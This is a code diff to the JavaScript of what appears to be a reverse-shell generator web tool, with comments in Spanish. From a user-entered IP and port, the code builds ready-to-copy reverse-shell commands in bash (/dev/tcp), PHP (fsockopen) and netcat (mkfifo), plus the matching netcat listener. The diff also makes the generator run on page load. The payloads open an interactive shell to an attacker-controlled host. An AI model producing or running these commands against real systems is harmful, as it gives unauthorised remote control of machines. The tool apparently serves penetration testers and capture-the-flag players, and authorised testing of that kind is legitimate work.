@@ -128,20 +128,23 @@ document.addEventListener("DOMContentLoaded", () => {
         const rsCards = document.querySelectorAll(".shell-card");
 
         function generateShell() {
+            // Si falta IP o Puerto, mostramos mensaje de espera
             if (!rsHost.value || !rsPort.value) {
-                rsOutput.innerText = "Completa IP y Puerto...";
+                rsOutput.innerText = "Completa IP y Puerto arriba...";
                 rsListener.innerText = "nc -lvnp <PUERTO>";
                 return;
             }
 
-            let ip = rsHost.value;
-            let p = rsPort.value;
+            let ip = rsHost.value.trim();
+            let p = rsPort.value.trim();
 
+            // Lógica de URL Encode
             if (rsUrlEncode.checked) {
                 ip = encodeURIComponent(ip);
                 p = encodeURIComponent(p);
             }
 
+            // Detectar cuál está activa
             const activeCard = document.querySelector(".shell-card.active input");
             const type = activeCard ? activeCard.value : 'bash';
 
@@ -151,19 +154,23 @@ document.addEventListener("DOMContentLoaded", () => {
                     command = `bash -i >& /dev/tcp/${ip}/${p} 0>&1`;
                     break;
                 case 'php':
+                    // Payload PHP robusto para web shells
                     command = `php -r '$sock=fsockopen("${ip}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`;
                     break;
                 case 'nc':
+                    // Payload Netcat mkfifo (el más común)
                     command = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${p} >/tmp/f`;
                     break;
                 default:
                     command = `bash -i >& /dev/tcp/${ip}/${p} 0>&1`;
             }
 
+            // Inyectamos texto (innerText) para que el botón de copiar genérico lo lea bien
             rsOutput.innerText = command;
-            rsListener.innerText = `nc -lvnp ${rsPort.value}`;
+            rsListener.innerText = `nc -lvnp ${rsPort.value}`; // Listener siempre usa el puerto sin encode
         }
 
+        // Eventos para las tarjetas (click visual y lógica)
         rsCards.forEach(card => {
             card.addEventListener("click", () => {
                 rsCards.forEach(c => c.classList.remove("active"));
@@ -174,10 +181,14 @@ document.addEventListener("DOMContentLoaded", () => {
             });
         });
 
+        // Eventos para los inputs
         [rsHost, rsPort, rsUrlEncode].forEach(el => {
             el.addEventListener("input", generateShell);
             el.addEventListener("change", generateShell);
         });
+
+        // --- IMPORTANTE: Ejecutar al inicio para rellenar datos si ya hay IP ---
+        generateShell();
     }
 
     // -----------------------------------------------------------------------
